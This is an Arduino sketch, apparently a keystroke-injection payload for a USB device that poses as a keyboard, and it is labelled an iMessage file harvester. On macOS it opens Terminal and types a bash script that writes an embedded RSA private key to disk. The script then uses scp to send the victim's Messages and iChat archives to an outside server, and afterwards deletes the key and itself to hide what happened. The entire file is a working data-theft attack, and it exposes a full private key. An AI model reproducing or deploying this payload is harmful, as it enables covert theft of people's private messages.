/*
 * Generated with <3 by Dckuino.js, an open source project !
 */

#include "Keyboard.h"

void load_delay() {
    while(1) {
        delay(1000);
        Serial.println("Waiting for upload...");
    }
}

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // pushbutton setup, check for new script

  pinMode(8, INPUT);
  delay(1000);
  if(digitalRead(8) == HIGH) {
    Serial.begin(115200);
    load_delay();
  }

  // macOS prologue, escapes new keyboard setup (macOS Sierra+)
  // Added by Naookie Sato, not a part of Duckuino
  delay(500);
  typeKey(KEY_ESC);
  delay(500);
  typeKey(KEY_ESC);
  delay(500);
  typeKey(KEY_RETURN);
  delay(500);
  typeKey(KEY_ESC);
  delay(500);

  // imessage file harvester
  // Compiled for ATMEGA32U4 Microcontrollers by Naookie Sato,
  // Source Bunny script by Ashton Shears, using Naookie Sato's bash script

  delay(1200);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  Keyboard.print("terminal");

  delay(1500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("rm ~/.harvester.sh.swp");

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("rm ~/harvester.sh");

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("vim ~/harvester.sh");

  typeKey(KEY_RETURN);

  delay(500);

  // *****NOW TYPING BASH SCRIPT*****
  Keyboard.print("i");

  Keyboard.print("ARCHIVE=~/Library/Containers/com.apple.iChat/Data/Library/Messages/Archive");

  typeKey(KEY_RETURN);

  Keyboard.print("MESSAGES=~/Library/Messages");

  typeKey(KEY_RETURN);

  Keyboard.print("SERV=www.fsckyourself.com");

  typeKey(KEY_RETURN);

  Keyboard.print("SERVPORT=8087");

  typeKey(KEY_RETURN);

  Keyboard.print("SERVUSER=ms");

  typeKey(KEY_RETURN);

  Keyboard.print("SERVPATH=/home/ms/messages");

  typeKey(KEY_RETURN);

  Keyboard.print("KEY=\"-----BEGIN RSA PRIVATE KEY-----\\nMIIEowIBAAKCAQEA7RZyPnBFV3V5Lffo2m/YwsjrGLC0FTzsjwnXiCfYYkCHMjep\\nZ5zzN94tDeXFRKWhL3OHXXxUKudgVgANmtQcBXKRx7R/bJRlhknUvpwHJ5giQOxy\\nSKBb0TmIi0xsmQNTv6vxPjV9nrvLDdcJJuBaf0xeJv+cXv9pYU5TYgXvzIuIG5+m\\nEoc+lwkoEYltXLDWF3vM5VaMcJSVeNSaQu5iHi9BDCVHNdluFPpufRi8xsI/CMlT\\nGyNezdnOBUi4xCwL4BVqCMLbWLebJ+3oZZdDyWFHErSCMLrKSWn3Bd4NIjrWw46T\\nvPlGzIkei8T16NbMvKuiDH9KE7GzHv8M4Mcb+QIDAQABAoIBAHORf3rkK0jooHtB\\n3yWrY5P/cGoGqKG5ou5Os9tQ4O9z2PMnotI49W4ERR4DJNfDjQCeZhux4S1Qv+rr\\n97XDMy2MnXcliv+YjqyZDLUlRW+NfxT6rPKuCFPCocaVKFKmBorl+6CBXoyjqeVD\\nLtjef/6RcUu9SbIc+ndOQOMFVdD0OuPKOYND51EJvpSdJAtklvlNbuPOfYrM7gR4\\n5d/OKXcRwY3eu/nrUrSgbHp7Ypk+1mMgFdMBIn4BkkJN+KdybYsJNuRUZGv+zUsq\\nj+LB4qNptw6zEkAX5CISbDP1UdwW5MfkSEeQCOPnpZ+45jLE53qXpasgH3e6veC/\\nn72WvAECgYEA9sWjmXjaLOIbbdSaiZf+pL1KqeIygr9e4gLE22uuIU8BQSdLjLCx\\nUx0fEmzNVHkgpDNY/uT7EmT0cTHSNVnuyrZ3AyOCys6JQ/SHBy5uudO7RinELBi2\\ntFIZgceK/EVsVU75Tr6+RpRz1MSBzacH5tiIeVu3UEeCYNOaVEw6CLkCgYEA9fQZ\\nNT+8qKhvX5H1eLgsgh0LpeESflOj3UfQ7sWnKy3PQjueXZsq22OpaRYdDG5hCOhl\\nHlHkffjmAGYoGfIXhNldgk4vX9rBVJKWcIjl61hzzZaG1rOW4C36Y/qxtQAPZGh5\\nYY31YDCDmysz6oohIXvXH+Kw6Hk6KK0leXCljUECgYEAp9iGDj1FKIIiZfHVqwDX\\nEvYtcp+H+6ZuwwtfGl+DcORr1gUEPg1wjzefisi2YF6C9Sx3u+fDXh+Mo/FfKSqi\\nYP76tAfTTl5svuvza88JQRvipTaDV/r3Sm8NKlivECeoJ94vdIAIq7kNkAqYv2h8\\n12cwbFsVtGTvKSzEK9ItJwECgYA7uyhUEkKTAzTpFN10j+XfQ4aMpniDTXTCTKql\\nEkNi7SEkiK4RNZnW5gFCkChF2JigPTAxiNng7g2Nk0Gx62Vi0hcviiVfNhU1oNQA\\nSH7uBPE6wI/GnJ7Lmt7wYPW/a2BRlj3EP2GUFrQffwKAt0MMirLX/4nPK4HAVyx+\\nrajHAQKBgBzVs1KdlQsDNLoqDPc/StoOzj7CaYXmGrrDGODkeDRyUxRGD6b3Heku\\nGlhQLbU0e6V7ATgftgAoGKCQaiwtIvm4/VpK7epTIk5Gp25vTaXmmXdolRgnx8Lj\\n11yAr3T+4+MBN9HbbqipuhysqypSrMOAC4570iFeHPbHPjhlDy2I\\n-----END RSA PRIVATE KEY-----\"");

  typeKey(KEY_RETURN);

  Keyboard.print("KEYDIR=~/.msssh/");

  typeKey(KEY_RETURN);

  Keyboard.print("KEYPATH=~/.msssh/id_rsa");

  typeKey(KEY_RETURN);

  Keyboard.print("mkdir ${KEYDIR}");

  typeKey(KEY_RETURN);

  Keyboard.print("echo -e ${KEY} > ${KEYPATH}");

  typeKey(KEY_RETURN);

  Keyboard.print("chmod 400 ${KEYPATH}");

  typeKey(KEY_RETURN);

  Keyboard.print("cd ${ARCHIVE}");

  typeKey(KEY_RETURN);

  Keyboard.print("if [ $? -eq 0 ]; then");

  typeKey(KEY_RETURN);

  Keyboard.print("   ssh -i ${KEYPATH} -p ${SERVPORT} -o StrictHostKeyChecking=no ${SERVUSER}@${SERV} \"mkdir ${SERVPATH}\"");

  typeKey(KEY_RETURN);

  Keyboard.print("   ssh -i ${KEYPATH} -p ${SERVPORT} -o StrictHostKeyChecking=no ${SERVUSER}@${SERV} \"mkdir ${SERVPATH}/${USER}\"");

  typeKey(KEY_RETURN);

  Keyboard.print("   scp -i ${KEYPATH} -P ${SERVPORT} -o StrictHostKeyChecking=no -r ${ARCHIVE} ${SERVUSER}@${SERV}://${SERVPATH}/${USER}/");

  typeKey(KEY_RETURN);

  Keyboard.print("fi");

  typeKey(KEY_RETURN);

  Keyboard.print("cd ${MESSAGES}");

  typeKey(KEY_RETURN);

  Keyboard.print("if [ $? -eq 0 ]; then");

  typeKey(KEY_RETURN);

  Keyboard.print("   ssh -i ${KEYPATH} -p ${SERVPORT} -o StrictHostKeyChecking=no ${SERVUSER}@${SERV} \"mkdir ${SERVPATH}\"");

  typeKey(KEY_RETURN);

  Keyboard.print("   ssh -i ${KEYPATH} -p ${SERVPORT} -o StrictHostKeyChecking=no ${SERVUSER}@${SERV} \"mkdir ${SERVPATH}/${USER}\"");

  typeKey(KEY_RETURN);

  Keyboard.print("   scp -i ${KEYPATH} -P ${SERVPORT} -o StrictHostKeyChecking=no -r ${MESSAGES} ${SERVUSER}@${SERV}://${SERVPATH}/${USER}/");

  typeKey(KEY_RETURN);

  Keyboard.print("fi");

  typeKey(KEY_RETURN);

  Keyboard.print("rm -rf ${KEYDIR} #cleanup");

  typeKey(KEY_LEFT_ESC);

  delay(50);

  Keyboard.print(":wq");

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("chmod +x ~/harvester.sh");

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("time ~/harvester.sh");

  typeKey(KEY_RETURN);

  Keyboard.print("rm -rf ~/harvester.sh");

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('q');
  Keyboard.releaseAll();

  delay(10);

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
